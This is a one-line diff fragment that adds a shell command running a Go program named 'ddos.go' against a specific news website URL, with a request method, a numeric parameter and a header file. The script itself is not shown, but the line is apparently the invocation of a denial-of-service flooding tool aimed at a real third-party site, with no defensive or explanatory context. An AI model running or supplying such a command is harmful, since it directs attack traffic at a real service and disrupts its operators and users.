@@ -1,0 +1,1 @@
+go run ddos.go https://www.thanhnientre.com/?m=110000 get 120 header.txt
